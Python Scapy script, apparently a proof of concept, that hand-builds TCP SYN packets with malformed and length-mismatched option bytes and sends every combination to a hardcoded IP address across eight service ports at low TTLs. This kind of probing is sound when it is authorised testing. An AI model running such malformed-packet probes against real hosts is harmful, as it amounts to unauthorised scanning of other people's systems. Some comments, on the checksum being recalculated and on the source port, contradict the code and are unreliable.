from scapy.all import *
import struct

# ============================================================
# TCP Options Length Mismatch — Full Matrix PoC (FIXED)
# Raw TCP header construction — bypasses Scapy options parser
# IP() / Raw(manual_tcp_bytes) method
# ============================================================

TARGET = "192.31.242.100"

# ── Destination Port Array ────────────────────────────────────
DPORT_LIST = [80, 443, 8080, 8443, 22, 21, 25, 53]

# ── TTL Array ─────────────────────────────────────────────────
TTL_LIST = [10,11,12]

# ── IP Protocol Array ─────────────────────────────────────────
IP_PROTO_LIST = [6]

# ── TCP Flags Array ───────────────────────────────────────────
TCP_FLAGS_LIST = ["S"]

# ============================================================
# FLAG STRING → INT CONVERTER
# ============================================================
FLAG_MAP = {
    'F': 0x01,  # FIN
    'S': 0x02,  # SYN
    'R': 0x04,  # RST
    'P': 0x08,  # PSH
    'A': 0x10,  # ACK
    'U': 0x20,  # URG
}

def flags_to_int(flags_str):
    val = 0
    for c in flags_str:
        val |= FLAG_MAP.get(c, 0)
    return val

# ============================================================
# RAW TCP HEADER BUILDER
# Bypasses Scapy TCP options parser completely
# struct.pack builds exact bytes — no validation, no rewrite
#
# TCP Header structure (20 bytes base):
#   sport(2) dport(2) seq(4) ack(4)
#   dataofs+reserved(1) flags(1) window(2)
#   checksum(2) urgptr(2)
# + opt_bytes appended directly
# ============================================================
def build_tcp_raw(dport, flags_str, dataofs, opt_bytes):
    fval          = flags_to_int(flags_str)
    offset_rsvd   = (dataofs << 4) & 0xFF   # upper 4 bits = dataofs
    window        = 8192
    checksum      = 0xabc0                        # kernel will recalculate
    urgptr        = 0
    sport         = random.randint(0, 65535)                        # no source port
    seq           = 0
    ack_seq       = 0

    tcp_hdr = struct.pack('!HHIIBBHHH',
        sport,        # source port (0 = kernel assigns)
        dport,        # destination port
        seq,          # sequence number
        ack_seq,      # acknowledgement number
        offset_rsvd,  # data offset (4 bits) + reserved (4 bits)
        fval,         # flags byte
        window,       # window size
        checksum,     # checksum (0 = auto)
        urgptr        # urgent pointer
    )
    return tcp_hdr + opt_bytes   # raw options appended directly

# ============================================================
# DATAOFS → OPTIONS MAPPING
# options_window = (dataofs × 4) - 20
# All option bytes padded to exact window size
# ============================================================

DATAOFS_OPTIONS_MAP = {

     # ── dataofs=6 → 4 bytes ──────────────────────────────────
    6: [
        ("NOP×4",                        b'\x01\x01\x01\x01'),
        ("EOL+NOP×3",                    b'\x00\x01\x01\x01'),
        ("SACK-OK+NOP×2",                b'\x04\x02\x01\x01'),
        ("WinScale=0+NOP",               b'\x03\x03\x00\x01'),
        ("WinScale=255+NOP",             b'\x03\x03\xff\x01'),
        ("MSS=1460 exact",               b'\x02\x04\x05\xb4'),
        ("MSS=0 malformed",              b'\x02\x04\x00\x00'),
        ("TS Kind=8 Len=10 MISMATCH",    b'\x08\x0a\x00\x00'),
        ("SACK Len=10 MISMATCH",         b'\x05\x0a\x00\x00'),
        ("Unknown Kind=255 MISMATCH",    b'\xff\x08\x00\x00'),
        ("RFC-Exp Kind=253",             b'\xfd\x04\x00\x00'),
        ("RFC-Exp Kind=254",             b'\xfe\x04\x00\x00'),
    ],

   
  
}

# ── Byte Verification ─────────────────────────────────────────
print("=" * 72)
print("  DATAOFS × OPTIONS BYTE VERIFICATION")
print("=" * 72)
all_ok = True
for dataofs, opt_list in sorted(DATAOFS_OPTIONS_MAP.items()):
    window = (dataofs * 4) - 20
    print(f"\n  dataofs={dataofs} → header={dataofs*4}B → options_window={window}B")
    for desc, raw in opt_list:
        ok = len(raw) == window
        status = "✓" if ok else "✗ FAIL"
        if not ok:
            all_ok = False
        print(f"    [{status}] {len(raw):>2}B  {raw.hex() if raw else 'empty':<82}  {desc}")

print("\n" + "=" * 72)
print(f"  Verification: {'ALL PASS ✓' if all_ok else 'FAILURES FOUND ✗'}")
print("=" * 72)

# ── Matrix Stats ──────────────────────────────────────────────
total_opts = sum(len(v) for v in DATAOFS_OPTIONS_MAP.values())
total_pkts = (len(DPORT_LIST) * len(TTL_LIST) * len(IP_PROTO_LIST) *
              len(TCP_FLAGS_LIST) * total_opts)

print(f"  Target       : {TARGET}")
print(f"  Dport        : {DPORT_LIST}  ({len(DPORT_LIST)})")
print(f"  TTL          : {TTL_LIST}  ({len(TTL_LIST)})")
print(f"  DataOfs      : {list(DATAOFS_OPTIONS_MAP.keys())}  ({len(DATAOFS_OPTIONS_MAP)})")
print(f"  IP Proto     : {IP_PROTO_LIST}  ({len(IP_PROTO_LIST)})")
print(f"  TCP Flags    : {TCP_FLAGS_LIST}  ({len(TCP_FLAGS_LIST)})")
print(f"  Options      : {total_opts} variants across all offsets")
print(f"  Total Pkts   : {total_pkts}")
print(f"  Build method : IP() / Raw(struct.pack TCP) — bypasses Scapy parser")
print("=" * 72)

# ── Full Matrix Send Loop ─────────────────────────────────────
pkt_count = 0

for ttl in TTL_LIST:
    for proto in IP_PROTO_LIST:
        for dport in DPORT_LIST:
            for flags in TCP_FLAGS_LIST:
                for dataofs, opt_list in sorted(DATAOFS_OPTIONS_MAP.items()):
                    window = (dataofs * 4) - 20
                    for opt_desc, opt_bytes in opt_list:

                        # Build raw TCP bytes (no Scapy options parser)
                        tcp_raw = build_tcp_raw(dport, flags, dataofs, opt_bytes)

                        # IP layer only — TCP as Raw payload
                        pkt = IP(dst=TARGET, ttl=ttl, proto=proto) / Raw(tcp_raw)

                        pkt_count += 1
                        print(f"[{pkt_count:>6}] "
                              f"TTL={ttl:>3} | "
                              f"Proto={proto:>3} | "
                              f"→{dport:<5} | "
                              f"Flags={flags:<8} | "
                              f"Ofs={dataofs}({window:>2}B) | "
                              f"{opt_bytes[:4].hex() if opt_bytes else 'empty':8}  "
                              f"{opt_desc}")
                        sr1(pkt,timeout=1, retry=0, verbose=0)

print("=" * 72)
print(f"[✓] Matrix complete — {pkt_count} packets sent to {TARGET}")
print("[i] Wireshark : tcp.options || tcp.hdr_len >= 20")
print(f"[i] tcpdump   : tcpdump -i eth0 'tcp and host {TARGET}'")
